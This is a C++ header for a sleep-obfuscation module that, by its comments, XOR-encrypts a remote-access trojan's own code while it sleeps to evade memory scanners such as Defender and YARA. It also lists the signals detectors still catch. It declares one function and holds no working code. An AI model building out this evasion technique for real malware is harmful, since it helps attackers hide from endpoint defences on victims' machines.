#pragma once
#ifndef SLEEPOBFUSC_H
#define SLEEPOBFUSC_H
#include "common.h"

// SleepObfusc — encrypt the RAT's own .text section while sleeping.
//
// Detection surface this targets:
//   - Memory scanners (Defender, MDE, YARA) scan for code signatures in RX pages
//   - While we sleep the .text section is XOR-encrypted → RW (not RX), no signatures
//   - Sleep is executed from a separate RWX stub so we don't call our own encrypted code
//
// What a strong detector still catches:
//   - The VirtualProtect calls: RX→RW on own image = high-confidence Sysmon EID 10 / EID 8
//   - The RWX stub allocation: NtAllocateVirtualMemory with PAGE_EXECUTE_READWRITE
//   - Entropy spike: .text section transitions from low (~3 bits) to high (~7.9 bits) entropy
//   - Timer resolution: if jitter is too regular, frequency analysis still finds the beacon
//
// MITRE T1497.003 (Time Based Evasion), T1027.007 (Dynamic API Resolution)

namespace SleepObfusc {
    // Sleep for `ms` milliseconds while the .text section is XOR-encrypted.
    // ms_jitter adds a random extra delay in [0, ms_jitter) ms.
    void ObfuscatedSleep(DWORD ms, DWORD ms_jitter = 0);
}

#endif
